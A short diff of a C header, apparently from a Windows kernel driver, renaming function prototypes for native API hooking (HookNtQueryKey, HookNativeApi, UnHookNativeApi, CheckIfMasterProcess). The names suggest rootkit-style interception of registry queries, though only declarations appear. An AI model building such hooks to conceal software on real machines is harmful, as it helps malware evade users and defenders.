@@ -299,10 +299,9 @@ NTSTATUS HookNtQueryKey(
 	PULONG Byte
 );
     
-VOID HookApis();                                   
-VOID UnHookApis();                             
-VOID SetupIndexes();                           
-BOOLEAN IsPriviligedProcess( PEPROCESS eproc );
+VOID HookNativeApi();                                   
+VOID UnHookNativeApi();                             
+BOOLEAN CheckIfMasterProcess( PEPROCESS eproc );
 
 //---------------------------------------------------------------------------------
 // IMPORTY FUNKCJI I ZMIENNYCH
